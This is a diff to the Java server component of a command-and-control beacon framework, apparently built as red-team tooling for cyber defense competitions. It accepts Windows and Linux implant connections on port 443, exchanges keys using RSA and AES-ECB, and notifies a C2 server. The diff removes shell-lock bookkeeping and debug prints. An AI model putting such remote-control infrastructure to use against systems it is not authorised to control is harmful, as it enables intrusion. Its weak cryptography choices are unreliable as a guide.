@@ -18,10 +18,6 @@ public class BeaconServer implements Runnable{
     // Dictionary to Map IP's to Objects that handle them
     private HashMap<String,BeaconClientHandler> windowsClientObjects;
     private HashMap<String,BeaconClientHandler> linuxClientObjects;
-
-    // Dictionary to Map IP's to shellLocks (Locks that are used for notifying/waiting when the user wants responses instantly)
-    private HashMap<String,Object> windowsShellLocks;
-    private HashMap<String,Object> linuxShellLocks;
     
     // Pointer to the Thread responsible for interacting with the C2 Server
     private BeaconC2Handler C2Handler;
@@ -35,9 +31,6 @@ public class BeaconServer implements Runnable{
     // Objects used to determine whether or not the server is still deploying
     private boolean settingUp;
     private Object settingUpLock;
-
-    // ID used to make sure that .notify() is not called when it shouldn't
-    private int shellID;
 
     // RSA object used for rsa encryption to transfer AES keys with clients
     private rsa rsa;
@@ -56,15 +49,12 @@ public class BeaconServer implements Runnable{
 
         this.windowsClientObjects = new HashMap<>();
         this.linuxClientObjects = new HashMap<>();
-        this.windowsShellLocks = new HashMap<>();
-        this.linuxShellLocks = new HashMap<>();
         this.C2Handler = new BeaconC2Handler(this, C2ServerIPAddress, passwordDigest);
         this.serverSocket = new ServerSocket(443);
         this.settingUp = false;
         synchronized(settingUpLock){
             settingUpLock.notify();
         }
-        this.shellID = 0;
         this.rsa = new rsa(1024);
     }
 
@@ -176,10 +166,6 @@ public class BeaconServer implements Runnable{
         }
     }
 
-    public int getShellID(){
-        return shellID;
-    }
-
     /**
      * This Function is used by the client handler to inform the C2 Server that it has lost a client
      * @param data
@@ -210,7 +196,6 @@ public class BeaconServer implements Runnable{
                 } else {
                     OSMessage = firstMessage;
                 }
-                System.out.println("Inital Message: " + firstMessage);
 
                 if(!(OSMessage.isEmpty())){
                     // Second Message is from the client to the server, the IP address of the client.
@@ -218,14 +203,10 @@ public class BeaconServer implements Runnable{
                     // In competitions the private IP addresses have a lot of meaning, typically they will follow some format 
                     // 10.a.b.c, where a = team number, b = OS (1 = Windows, 2 = Linux), and c will be the specific host
                     String IPAddress = duplexer.receive();
-                    System.out.println("IP Address: " + IPAddress);
 
                     if(OSMessage.equals("Windows") || OSMessage.equals("Linux")){
                         // Send message to C2 announcing that a new client has been obtained
                         C2Handler.sendDataToC2Server("{\"ip\": \"" + IPAddress + "\", \"type\": \"client_connect\", \"data\": \"New " + OSMessage + " Client\"}");
-                        
-                        // Create object used for notifying/waiting when user wants responses back immeediately
-                        Object shellLockObject = new Object();
 
                         // Send public key to client
                         duplexer.send(rsa.getN(), true);
@@ -242,18 +223,18 @@ public class BeaconServer implements Runnable{
                         aes aes = new aes(key, modes.ECB);
 
                         // Create new Beacon Client Handler Thread to handle this connection between the Beacon and the client
-                        BeaconClientHandler clientHandler = new BeaconClientHandler(IPAddress, duplexer, this, OSMessage, shellLockObject, aes);
+                        BeaconClientHandler clientHandler = new BeaconClientHandler(IPAddress, duplexer, this, OSMessage, aes);
                         Thread clientHandlerThread = new Thread(clientHandler);
                         clientHandlerThread.start();
     
                         // Add to client lists
                         if(OSMessage.equals("Windows")){
                             windowsClientObjects.put(IPAddress,clientHandler);
-                            windowsShellLocks.put(IPAddress, shellLockObject);
                         }else if(OSMessage.equals("Linux")){
                             linuxClientObjects.put(IPAddress,clientHandler);
-                            linuxShellLocks.put(IPAddress, shellLockObject);
                         }
+
+                        System.out.println("New HTTP Client: " + IPAddress);
                     }
                 }
             } catch(IOException e){
